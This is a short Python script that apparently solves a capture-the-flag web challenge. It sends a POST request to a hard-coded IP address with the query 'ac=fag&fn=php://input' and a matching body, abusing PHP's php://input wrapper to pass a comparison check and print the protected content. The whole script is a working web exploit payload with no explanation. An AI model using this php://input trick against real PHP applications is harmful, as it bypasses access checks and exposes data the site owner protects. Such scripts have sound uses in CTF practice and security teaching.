#-*-coding:utf-8-*-
import requests

url='http://123.206.87.240:8002/web8/'
ss = requests.session()

suffix = "ac=fag&fn=php://input"
payload = "fag"
content = ss.post(url=url+'?'+suffix,data=payload).content.decode('utf-8')
print("len:"+str(len(content)))
print(content)